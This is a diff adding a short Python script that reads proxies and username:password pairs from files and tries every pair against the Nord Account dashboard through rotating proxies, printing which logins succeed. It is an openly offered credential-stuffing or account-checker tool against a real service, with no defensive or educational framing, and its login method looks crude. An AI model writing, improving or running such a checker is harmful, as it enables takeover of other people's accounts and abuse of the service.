@@ -1,0 +1,31 @@
+import requests
+from bs4 import BeautifulSoup
+
+# path to the file where you keep proxies and usernames/passwords file
+proxies_file = open('proxies.txt', 'r')
+proxies = proxies_file.readlines()
+
+userpass_file = open('userpass.txt', 'r')
+userpass = userpass_file.readlines()
+
+for proxy in proxies:
+    for up in userpass:
+        # Split username and password
+        username, password = up.strip().split(':')
+
+        # Set up request session with proxy and authentication
+        session = requests.Session()
+        session.proxies = {
+            'http': f'http://{proxy}',
+            'https': f'https://{proxy}'
+        }
+        session.auth = (username, password)
+
+        url = 'https://my.nordaccount.com/dashboard'
+        response = session.get(url)
+
+        soup = BeautifulSoup(response.text, 'html.parser')
+        if soup.find('title').text == 'Nord Account Dashboard':
+            print(f'Successful login for {username}')
+        else:
+            print(f'Failed login for {username}')
